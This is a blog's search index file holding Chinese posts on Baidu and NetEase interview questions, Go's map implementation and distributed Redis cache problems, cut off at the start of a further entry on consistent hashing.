<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>百度面经（秋招）</title>
      <link href="/2019/09/22/2019-09-22-%E7%99%BE%E5%BA%A6%E9%9D%A2%E7%BB%8F%EF%BC%88%E7%A7%8B%E6%8B%9B%EF%BC%89/"/>
      <url>/2019/09/22/2019-09-22-%E7%99%BE%E5%BA%A6%E9%9D%A2%E7%BB%8F%EF%BC%88%E7%A7%8B%E6%8B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 三面面试官口头offer <i class="fa fa-quote-right"></i></p><a id="more"></a><p>22号北京现场面，真的好累，脑袋都是懵的，可能记录不全。</p><h3 id="一面-45分钟"><a href="#一面-45分钟" class="headerlink" title="一面 - 45分钟"></a>一面 - 45分钟</h3><p><strong>简历：</strong></p><ul><li>项目相关（bala了大半时间）</li><li>说说mysql索引</li><li>为什么mysql索引要用b+树</li><li>索引最左匹配</li><li>索引失效情况</li><li>进程、线程、协程</li><li>进程间通信</li><li>共享内存与信号量的优缺点</li><li>分布式锁</li><li>限流算法</li></ul><p><strong>算法：</strong></p><ul><li>手撕lru</li><li>手撕一维dp</li></ul><h3 id="二面-一小时"><a href="#二面-一小时" class="headerlink" title="二面 - 一小时"></a>二面 - 一小时</h3><p><strong>发散：</strong></p><ul><li>为什么用协程</li><li>说说用户态和内核态</li><li>解释一下中断</li><li>解释一下缺页</li><li>说说换页算法</li><li>说说虚拟内存</li><li>redis数据结构和底层实现</li><li>redis过期策略</li><li>redis持久化</li><li>fork阻塞</li><li>布隆过滤器</li><li>cgi和fastcgi</li></ul><p><strong>算法+场景：</strong></p><ul><li>手撕二维dp</li><li>敏感词过滤（字典树）</li><li>大文件中关键词搜索（hash取余切割文件、维护热频词堆）</li><li>高并发秒杀场景设计（先来先得设计、一天内平均发放设计）</li></ul><h3 id="三面（C-）-半小时"><a href="#三面（C-）-半小时" class="headerlink" title="三面（C++）- 半小时"></a>三面（C++）- 半小时</h3><ul><li>自我介绍</li><li>跨域问题</li><li>说说websocket</li><li>PHP7新特性</li><li>opcache</li><li>比较一下PHP和golang</li><li>框架对比</li><li>框架设计</li><li>数据库设计</li><li>缓存设计</li><li>聊人生</li></ul><p>面试官主要是搞C++，面了我半小时突然说要换个人来…</p><h3 id="三面（PHP）-一小时"><a href="#三面（PHP）-一小时" class="headerlink" title="三面（PHP）- 一小时"></a>三面（PHP）- 一小时</h3><ul><li>自我介绍</li><li>session和cookie</li><li>安全策略</li><li>xss攻击+解决方案</li><li>PHP内存管理、垃圾回收机制</li><li>opcode</li><li>12306抢票场景设计</li><li>摇一摇抢红包场景设计</li><li>聊人生（不知道为什么还聊到了鸟哥hhhh）</li></ul><p>问题基本就是这些，聊完人生后突然跟我介绍起了他们部门的业务方向，问我感不感兴趣，说刚好还差一个hc就决定是我了，然后加了微信…</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结就是虽然从下午两点半一直到七点半才结束，面试加等待持续了五个小时很累很累，但是百度面试体验真的一级棒呀！</p><p>每个面试官都很认真的在听你说话，二面说一个思路的时候我脑子里是想的清楚的，说出来就不太清晰，然后面试官还是很努力的在了解我的思路想法，最后还是捋清楚了。三面聊人生说到一件颇为伤感的事，面试官还安慰我舒缓气氛，呜呜呜真的太好了。</p><p>希望hr面顺利，许愿offer🙏</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易互娱面经（秋招）</title>
      <link href="/2019/09/19/2019-09-19-%E7%BD%91%E6%98%93%E4%BA%92%E5%A8%B1%E9%9D%A2%E7%BB%8F%EF%BC%88%E7%A7%8B%E6%8B%9B%EF%BC%89/"/>
      <url>/2019/09/19/2019-09-19-%E7%BD%91%E6%98%93%E4%BA%92%E5%A8%B1%E9%9D%A2%E7%BB%8F%EF%BC%88%E7%A7%8B%E6%8B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 一切皆看缘分 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前天收到的面试邮件邀请。</p><h3 id="一面-50分钟"><a href="#一面-50分钟" class="headerlink" title="一面 - 50分钟"></a>一面 - 50分钟</h3><p>19号的一面电面，面试官很明显的广东口音，hhh还挺萌捏</p><p>简历+发散：</p><ul><li>自我介绍</li><li>挑一个最有亮点的项目讲讲</li><li>进程、线程、协程的区别</li><li>swoole协程与golang协程对比</li><li>用协程一定比用线程效率高吗</li><li>redis list的底层实现</li><li>说说对称加密和非对称加密</li><li>为什么自己实现加密，不用https</li><li>说说mysql的优化经验（index_merge）</li><li>说说mysql索引</li><li>组合索引</li><li>说说实习公司用git的开发流程</li></ul><p>算法：</p><ul><li>如果一个文件每一行是一个用户id，求用户id频率最高的top10？时间复杂度是多少？（hash表+小顶堆）</li><li>上面继续，如果文件非常非常大，远大于内存呢？（切割+归并）</li><li>怎么用数据结构实现LRU，并使得查找与删除时间复杂度为O(1)？（双向链表+hash表）</li><li>上面继续，如果不是LRU，按访问次数删除呢？（双向链表+两个hash表）</li><li>上面再继续，怎么减小交换？（双向链表+三个hash表）</li></ul><p>难度还算好吧，主要是针对简历提问，所以简历每个点都必须弄明白。<br>全程50分钟，结束的时候面试官问了一下意向工作地点，然后说通过的话五到七天会有hr联系约二面的技术面，但是没让我提问，顿时心里一咯噔。</p><h3 id="二面-1小时"><a href="#二面-1小时" class="headerlink" title="二面 - 1小时"></a>二面 - 1小时</h3><p>23号约的面试，24号二面视频面</p><ul><li>自我介绍</li><li>说说index_merge</li><li>怎么建表建索引</li><li>组合索引命中问题</li><li>where和order by中的字段建组合索引会提高查询速率吗？为什么？</li><li>写一下堆排</li><li>说一下PHP的内存管理机制</li><li>如果一个网页打不开，怎么排查？</li><li>如果ping的通但是网页打不开，怎么排查？</li><li>一个进程很卡，怎么排查？（cpu、内存）</li><li>如果内存是8g，进程占了7g，你有实锤说明是内存瓶颈吗？（内存颠簸）</li><li>为什么用迅雷比普通网页中的下载要快？（我说p2p）</li><li>除了p2p呢？（多线程分片）</li><li>为什么用nginx做负载均衡，不直接通过dns域名映射不同的ip？（负载策略、灰度发布）</li><li>如果你是你们公司的网管，你要怎么防止公司内员工访问某个网站？（网关层、路由器层）</li><li>你知道session的底层实现吗？</li><li>get、post的安全问题（我说如果是http，没有实际的差别，都可以抓包获取）</li><li>那除去抓包和旁边有人看着你输入url外，还有什么安全性的不同吗？（浏览器历史记录、搜索引擎、盗链）</li></ul><p>二面的问题十分不常规，开放性问题很多，需要对操作系统、网络、数据库等整个体系有比较完整的了解。</p><p>最后说通过的话5个工作日内会有hr联系，叫我保持手机畅通</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang的Map实现</title>
      <link href="/2019/09/17/2019-09-17-Golang%E7%9A%84Map%E5%AE%9E%E7%8E%B0/"/>
      <url>/2019/09/17/2019-09-17-Golang%E7%9A%84Map%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> Golang map 的底层实现 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在开发过程中，map是必不可少的数据结构，在Golang中，使用map或多或少会遇到与其他语言不一样的体验，比如访问不存在的元素会返回其类型的空值、map的大小究竟是多少，为什么会报”cannot take the address of”错误，遍历map的随机性等等。</p><p>本文希望通过研究map的底层实现，以解答这些疑惑。</p><h3 id="数据结构及内存管理"><a href="#数据结构及内存管理" class="headerlink" title="数据结构及内存管理"></a>数据结构及内存管理</h3><p>hashmap的定义位于 src/runtime/hashmap.go 中，首先我们看下hashmap和bucket的定义：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> hmap <span class="keyword">struct</span> &#123;</span><br><span class="line">    count     <span class="keyword">int</span>    <span class="comment">// 元素的个数</span></span><br><span class="line">    flags     <span class="keyword">uint8</span>  <span class="comment">// 状态标志</span></span><br><span class="line">    B         <span class="keyword">uint8</span>  <span class="comment">// 可以最多容纳 6.5 * 2 ^ B 个元素，6.5为装载因子</span></span><br><span class="line">    noverflow <span class="keyword">uint16</span> <span class="comment">// 溢出的个数</span></span><br><span class="line">    hash0     <span class="keyword">uint32</span> <span class="comment">// 哈希种子</span></span><br><span class="line"></span><br><span class="line">    buckets    unsafe.Pointer <span class="comment">// 桶的地址</span></span><br><span class="line">    oldbuckets unsafe.Pointer <span class="comment">// 旧桶的地址，用于扩容</span></span><br><span class="line">    nevacuate  <span class="keyword">uintptr</span>        <span class="comment">// 搬迁进度，小于nevacuate的已经搬迁</span></span><br><span class="line">    overflow *[<span class="number">2</span>]*[]*bmap </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，overflow是一个指针，指向一个元素个数为2的数组，数组的类型是一个指针，指向一个slice，slice的元素是桶(bmap)的地址，这些桶都是溢出桶；为什么有两个？因为Go map在hash冲突过多时，会发生扩容操作，为了不全量搬迁数据，使用了增量搬迁，<strong>[0]</strong> 表示当前使用的溢出桶集合，<strong>[1]</strong> 是在发生扩容时，保存了旧的溢出桶集合；overflow存在的意义在于防止溢出桶被gc。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A bucket for a Go map.</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">// 每个元素hash值的高8位，如果tophash[0] &lt; minTopHash，表示这个桶的搬迁状态</span></span><br><span class="line">    tophash [bucketCnt]<span class="keyword">uint8</span></span><br><span class="line">    <span class="comment">// 接下来是8个key、8个value，但是我们不能直接看到；为了优化对齐，go采用了key放在一起，value放在一起的存储方式，</span></span><br><span class="line">    <span class="comment">// 再接下来是hash冲突发生时，下一个溢出桶的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tophash的存在是为了快速试错，毕竟只有8位，比较起来会快一点。</p><p>从定义可以看出，不同于STL中map以红黑树实现的方式，Golang采用了HashTable的实现，解决冲突采用的是链地址法。也就是说，使用数组+链表来实现map。特别的，对于一个key，几个比较重要的计算公式为:</p><table><thead><tr><th>key</th><th>hash</th><th>hashtop</th><th>bucket index</th></tr></thead><tbody><tr><td>key</td><td>hash := alg.hash(key, uintptr(h.hash0))</td><td>top := uint8(hash &gt;&gt; (sys.PtrSize*8 - 8))</td><td>top := uint8(hash &gt;&gt; (sys.PtrSize*8 - 8))</td></tr></tbody></table><p>例如，对于B = 3，当hash(key) = 4时， hashtop = 0， bucket = 4，当hash(key) = 20时，hashtop = 0， bucket = 4；这个例子我们在搬迁过程还会用到。</p><p>内存布局类似于这样：</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic1.webp"><h3 id="创建-makemap"><a href="#创建-makemap" class="headerlink" title="创建 - makemap"></a>创建 - makemap</h3><p>map的创建比较简单，在参数校验之后，需要找到合适的B来申请桶的内存空间，接着便是穿件hmap这个结构，以及对它的初始化。</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic2.webp"><h3 id="访问-mapaccess"><a href="#访问-mapaccess" class="headerlink" title="访问 - mapaccess"></a>访问 - mapaccess</h3><p>对于给定的一个key，可以通过下面的操作找到它是否存在:</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic3.webp"><p>方法定义为:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// returns key, if not find, returns nil</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mapaccess1</span><span class="params">(t *maptype, h *hmap, key unsafe.Pointer)</span> <span class="title">unsafe</span>.<span class="title">Pointer</span> </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// <span class="title">returns</span> <span class="title">key</span> <span class="title">and</span> <span class="title">exist</span>. <span class="title">if</span> <span class="title">not</span> <span class="title">find</span>, <span class="title">returns</span> <span class="title">nil</span>, <span class="title">false</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">mapaccess2</span><span class="params">(t *maptype, h *hmap, key unsafe.Pointer)</span> <span class="params">(unsafe.Pointer, <span class="keyword">bool</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// <span class="title">returns</span> <span class="title">both</span> <span class="title">key</span> <span class="title">and</span> <span class="title">value</span>. <span class="title">if</span> <span class="title">not</span> <span class="title">find</span>, <span class="title">returns</span> <span class="title">nil</span>, <span class="title">nil</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">mapaccessK</span><span class="params">(t *maptype, h *hmap, key unsafe.Pointer)</span> <span class="params">(unsafe.Pointer, unsafe.Pointer)</span></span></span><br></pre></td></tr></table></figure><p>可见在找不到对应key的情况下，会返回nil</p><h3 id="分配-mapassign"><a href="#分配-mapassign" class="headerlink" title="分配 - mapassign"></a>分配 - mapassign</h3><p>为一个key分配空间的逻辑，大致与查找类似；但增加了写保护和扩容的操作；注意，分配过程和删除过程都没有在oldbuckets中查找，这是因为首先要进行扩容判断和操作；如下：</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic4.webp"><p><strong>扩容是整个hashmap的核心算法，我们放在第6部分重点研究。</strong></p><p>新建一个溢出桶，并将其拼接在当前桶的尾部，实现了类似链表的操作：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前桶的溢出桶</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bmap)</span> <span class="title">overflow</span><span class="params">(t *maptype)</span> *<span class="title">bmap</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(**bmap)(add(unsafe.Pointer(b), <span class="keyword">uintptr</span>(t.bucketsize)-sys.PtrSize))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置当前桶的溢出桶</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *hmap)</span> <span class="title">setoverflow</span><span class="params">(t *maptype, b, ovf *bmap)</span></span> &#123;</span><br><span class="line">    h.incrnoverflow()</span><br><span class="line">    <span class="keyword">if</span> t.bucket.kind&amp;kindNoPointers != <span class="number">0</span> &#123;</span><br><span class="line">        h.createOverflow()</span><br><span class="line">        <span class="comment">//重点，这里讲溢出桶append到overflow[0]的后面</span></span><br><span class="line">        *h.overflow[<span class="number">0</span>] = <span class="built_in">append</span>(*h.overflow[<span class="number">0</span>], ovf)</span><br><span class="line">    &#125;</span><br><span class="line">    *(**bmap)(add(unsafe.Pointer(b), <span class="keyword">uintptr</span>(t.bucketsize)-sys.PtrSize)) = ovf</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除-mapdelete"><a href="#删除-mapdelete" class="headerlink" title="删除 - mapdelete"></a>删除 - mapdelete</h3><p>删除某个key的操作与分配类似，由于hashmap的存储结构是数组+链表，所以真正删除key仅仅是将对应的slot设置为empty，并没有减少内存；如下：</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic5.webp"><h3 id="扩容-growWork"><a href="#扩容-growWork" class="headerlink" title="扩容 - growWork"></a>扩容 - growWork</h3><p>首先，判断是否需要扩容的逻辑是:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *hmap)</span> <span class="title">growing</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> h.oldbuckets != <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>何时h.oldbuckets不为nil呢？在分配assign逻辑中，当没有位置给key使用，而且满足测试条件(装载因子&gt;6.5或有太多溢出通)时，会触发hashGrow逻辑：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hashGrow</span><span class="params">(t *maptype, h *hmap)</span></span> &#123;</span><br><span class="line">    <span class="comment">//判断是否需要sameSizeGrow，否则"真"扩</span></span><br><span class="line">    bigger := <span class="keyword">uint8</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> !overLoadFactor(<span class="keyword">int64</span>(h.count), h.B) &#123;</span><br><span class="line">        bigger = <span class="number">0</span></span><br><span class="line">        h.flags |= sameSizeGrow</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// 下面将buckets复制给oldbuckets</span></span><br><span class="line">    oldbuckets := h.buckets</span><br><span class="line">    newbuckets := newarray(t.bucket, <span class="number">1</span>&lt;&lt;(h.B+bigger))</span><br><span class="line">    flags := h.flags &amp;^ (iterator | oldIterator)</span><br><span class="line">    <span class="keyword">if</span> h.flags&amp;iterator != <span class="number">0</span> &#123;</span><br><span class="line">        flags |= oldIterator</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 更新hmap的变量</span></span><br><span class="line">    h.B += bigger</span><br><span class="line">    h.flags = flags</span><br><span class="line">    h.oldbuckets = oldbuckets</span><br><span class="line">    h.buckets = newbuckets</span><br><span class="line">    h.nevacuate = <span class="number">0</span></span><br><span class="line">    h.noverflow = <span class="number">0</span></span><br><span class="line">        <span class="comment">// 设置溢出桶</span></span><br><span class="line">    <span class="keyword">if</span> h.overflow != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> h.overflow[<span class="number">1</span>] != <span class="literal">nil</span> &#123;</span><br><span class="line">            throw(<span class="string">"overflow is not nil"</span>)</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 交换溢出桶</span></span><br><span class="line">        h.overflow[<span class="number">1</span>] = h.overflow[<span class="number">0</span>]</span><br><span class="line">        h.overflow[<span class="number">0</span>] = <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK，下面正式进入重点，扩容阶段；在assign和delete操作中，都会触发扩容growWork：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">growWork</span><span class="params">(t *maptype, h *hmap, bucket <span class="keyword">uintptr</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 搬迁旧桶，这样assign和delete都直接在新桶集合中进行</span></span><br><span class="line">    evacuate(t, h, bucket&amp;h.oldbucketmask())</span><br><span class="line">        <span class="comment">//再搬迁一次搬迁过程中的桶</span></span><br><span class="line">    <span class="keyword">if</span> h.growing() &#123;</span><br><span class="line">        evacuate(t, h, h.nevacuate)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="搬迁过程"><a href="#搬迁过程" class="headerlink" title="搬迁过程"></a>搬迁过程</h4><p>一般来说，新桶数组大小是原来的2倍(在!sameSizeGrow()条件下)，新桶数组前半段可以”类比”为旧桶，对于一个key，搬迁后落入哪一个索引中呢？</p><blockquote><p>假设旧桶数组大小为2^B， 新桶数组大小为2*2^B，对于某个hash值X<br>若 X &amp; (2^B) == 0，说明 X &lt; 2^B，那么它将落入与旧桶集合相同的索引xi中；<br>否则，它将落入xi + 2^B中。</p></blockquote><p>例如，对于旧B = 3时，hash1 = 4，hash2 = 20，其搬迁结果类似这样:</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic6.webp"><p>源码中有些变量的命名比较简单，容易扰乱思路，我们注明一下便于理解。</p><table><thead><tr><th>变量</th><th>释义</th></tr></thead><tbody><tr><td>x *bmap</td><td>桶x表示与在旧桶时相同的位置，即位于新桶前半段</td></tr><tr><td>y *bmap</td><td>桶y表示与在旧桶时相同的位置+旧桶数组大小，即位于新桶后半段</td></tr><tr><td>xi int</td><td>桶x的slot索引</td></tr><tr><td>yi int</td><td>桶y的slot索引</td></tr><tr><td>xk unsafe.Pointer</td><td>索引xi对应的key地址</td></tr><tr><td>yk unsafe.Pointer</td><td>索引yi对应的key地址</td></tr><tr><td>xv unsafe.Pointer</td><td>索引xi对应的value地址</td></tr><tr><td>yv unsafe.Pointer</td><td>索引yi对应的value地址</td></tr></tbody></table><p>搬迁过程如下：</p><img src="/2019/09/17/2019-09-17-Golang的Map实现/pic7.webp"><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>到目前为止，Golang的map实现细节已经分析完毕，但不包含迭代器相关操作。通过分析，我们了解了map是由数组+链表实现的HashTable，其大小和B息息相关，同时也了解了map的创建、查询、分配、删除以及扩容搬迁原理。总的来说，Golang通过hashtop快速试错加快了查找过程，利用空间换时间的思想解决了扩容的问题，利用将8个key(8个value)依次放置减少了padding空间等等。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式缓存问题</title>
      <link href="/2019/09/15/2019-09-15-%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/"/>
      <url>/2019/09/15/2019-09-15-%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 关于分布式Redis经常被问到的问题 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p>缓存雪崩我们可以简单的理解为：由于原有缓存失效，新缓存未到期间(例如：我们设置缓存时采用了相同的过期时间，在同一时刻出现大面积的缓存过期)，所有原本应该访问缓存的请求都去查询数据库了，而对数据库CPU和内存造成巨大压力，严重的会造成数据库宕机。从而形成一系列连锁反应，造成整个系统崩溃。</p><p>缓存正常从Redis中获取，示意图如下：</p><img src="/2019/09/15/2019-09-15-分布式缓存问题/pic1.jpg"><p>缓存失效瞬间示意图如下：</p><img src="/2019/09/15/2019-09-15-分布式缓存问题/pic2.jpg"><p>缓存失效时的雪崩效应对底层系统的冲击非常可怕！大多数系统设计者考虑用加锁或者队列的方式保证来保证不会有大量的线程对数据库一次性进行读写，从而避免失效时大量的并发请求落到底层存储系统上。还有一个简单方案就时讲缓存失效时间分散开，比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。</p><p>以下简单介绍两种实现方式的伪代码：</p><p>（1）碰到这种情况，一般并发量不是特别多的时候，使用最多的解决方案是加锁排队，伪代码如下：</p><img src="/2019/09/15/2019-09-15-分布式缓存问题/pic3.jpg"><p>加锁排队只是为了减轻数据库的压力，并没有提高系统吞吐量。假设在高并发下，缓存重建期间key是锁着的，这是过来1000个请求999个都在阻塞的。同样会导致用户等待超时，这是个治标不治本的方法！</p><p>注意：加锁排队的解决方式分布式环境的并发问题，有可能还要解决分布式锁的问题；线程还会被阻塞，用户体验很差！因此，在真正的高并发场景下很少使用！</p><p>（2）还有一个解决办法解决方案是：给每一个缓存数据增加相应的缓存标记，记录缓存的是否失效，如果缓存标记失效，则更新数据缓存，实例伪代码如下：</p><img src="/2019/09/15/2019-09-15-分布式缓存问题/pic4.jpg"><p>解释说明：</p><ul><li>缓存标记：记录缓存数据是否过期，如果过期会触发通知另外的线程在后台去更新实际key的缓存；</li><li>缓存数据：它的过期时间比缓存标记的时间延长1倍，例：标记缓存时间30分钟，数据缓存设置为60分钟。 这样，当缓存标记key过期后，实际缓存还能把旧数据返回给调用端，直到另外的线程在后台更新完成后，才会返回新缓存。</li></ul><p>关于缓存崩溃的解决方法，这里提出了三种方案：使用锁或队列、设置过期标志更新缓存、为key设置不同的缓存失效时间，还有一各被称为“二级缓存”的解决方法，有兴趣的读者可以自行研究。</p><h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><p>缓存穿透是指用户查询数据，在数据库没有，自然在缓存中也不会有。这样就导致用户查询的时候，在缓存中找不到，每次都要去数据库再查询一遍，然后返回空（相当于进行了两次无用的查询）。这样请求就绕过缓存直接查数据库，这也是经常提的缓存命中率问题。</p><p>有很多种方法可以有效地解决缓存穿透问题，最常见的则是采用布隆过滤器，将所有可能存在的数据哈希到一个足够大的bitmap中，一个一定不存在的数据会被这个bitmap拦截掉，从而避免了对底层存储系统的查询压力。</p><p>另外也有一个更为简单粗暴的方法，如果一个查询返回的数据为空（不管是数据不存在，还是系统故障），我们仍然把这个空结果进行缓存，但它的过期时间会很短，最长不超过五分钟。通过这个直接设置的默认值存放到缓存，这样第二次到缓冲中获取就有值了，而不会继续访问数据库，这种办法最简单粗暴！</p><p>把空结果，也给缓存起来，这样下次同样的请求就可以直接返回空了，即可以避免当查询的值为空时引起的缓存穿透。同时也可以单独设置个缓存区域存储空值，对要查询的key进行预先校验，然后再放行给后面的正常缓存处理逻辑。</p><h3 id="缓存预热"><a href="#缓存预热" class="headerlink" title="缓存预热"></a>缓存预热</h3><p>缓存预热这个应该是一个比较常见的概念，相信很多小伙伴都应该可以很容易的理解，缓存预热就是系统上线后，将相关的缓存数据直接加载到缓存系统。这样就可以避免在用户请求的时候，先查询数据库，然后再将数据缓存的问题！用户直接查询事先被预热的缓存数据！</p><p>针对上面的技术我特意整理了一下，如果想学习Java工程化、高性能及分布式、深入浅出。微服务、Spring，MyBatis，Netty源码分析的朋友可以加Java进阶群：582505643，群里有阿里大牛直播讲解技术，以及Java大型互联网开源技术的视频免费分享给大家。</p><p>解决思路：</p><ul><li>直接写个缓存刷新页面，上线时手工操作下；</li><li>数据量不大，可以在项目启动的时候自动进行加载；</li><li>定时刷新缓存；</li></ul><h3 id="缓存更新"><a href="#缓存更新" class="headerlink" title="缓存更新"></a>缓存更新</h3><p>除了缓存服务器自带的缓存失效策略之外（Redis默认的有6中策略可供选择），我们还可以根据具体的业务需求进行自定义的缓存淘汰，常见的策略有两种：</p><ul><li>定时去清理过期的缓存；</li><li>当有用户请求过来时，再判断这个请求所用到的缓存是否过期，过期的话就去底层系统得到新数据并更新缓存。</li></ul><p>两者各有优劣，第一种的缺点是维护大量缓存的key是比较麻烦的，第二种的缺点就是每次用户请求过来都要判断缓存失效，逻辑相对比较复杂！具体用哪种方案，大家可以根据自己的应用场景来权衡。</p><h3 id="缓存降级"><a href="#缓存降级" class="headerlink" title="缓存降级"></a>缓存降级</h3><p>当访问量剧增、服务出现问题（如响应时间慢或不响应）或非核心服务影响到核心流程的性能时，仍然需要保证服务还是可用的，即使是有损服务。系统可以根据一些关键数据进行自动降级，也可以配置开关实现人工降级。</p><p>降级的最终目的是保证核心服务可用，即使是有损的。而且有些服务是无法降级的（如加入购物车、结算）。</p><p>在进行降级之前要对系统进行梳理，看看系统是不是可以丢卒保帅，从而梳理出哪些必须誓死保护，哪些可降级。</p><p>比如可以参考日志级别设置预案：</p><ul><li>一般：比如有些服务偶尔因为网络抖动或者服务正在上线而超时，可以自动降级；</li><li>警告：有些服务在一段时间内成功率有波动（如在95~100%之间），可以自动降级或人工降级，并发送告警；</li><li>错误：比如可用率低于90%，或者数据库连接池被打爆了，或者访问量突然猛增到系统能承受的最大阀值，此时可以根据情况自动降级或者人工降级；</li><li>严重错误：比如因为特殊原因数据错误了，此时需要紧急人工降级。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一致性hash算法</title>
